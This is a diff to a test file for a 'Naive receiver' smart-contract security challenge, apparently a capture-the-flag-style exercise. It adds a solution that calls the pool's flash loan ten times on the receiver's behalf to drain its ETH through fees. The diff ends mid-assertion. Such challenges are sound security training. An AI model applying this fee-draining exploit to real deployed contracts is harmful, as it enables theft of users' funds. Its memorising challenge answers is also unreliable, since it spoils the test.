@@ -38,10 +38,21 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        await pool.connect(player).flashLoan(receiver.address, pool.ETH(), 0, "0x");
+        await pool.connect(player).flashLoan(receiver.address, pool.ETH(), 0, "0x");
+        await pool.connect(player).flashLoan(receiver.address, pool.ETH(), 0, "0x");
+        await pool.connect(player).flashLoan(receiver.address, pool.ETH(), 0, "0x");
+        await pool.connect(player).flashLoan(receiver.address, pool.ETH(), 0, "0x");
+        await pool.connect(player).flashLoan(receiver.address, pool.ETH(), 0, "0x");
+        await pool.connect(player).flashLoan(receiver.address, pool.ETH(), 0, "0x");
+        await pool.connect(player).flashLoan(receiver.address, pool.ETH(), 0, "0x");
+        await pool.connect(player).flashLoan(receiver.address, pool.ETH(), 0, "0x");
+        await pool.connect(player).flashLoan(receiver.address, pool.ETH(), 0, "0x");
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+
 
         // All ETH has been drained from the receiver
         expect(
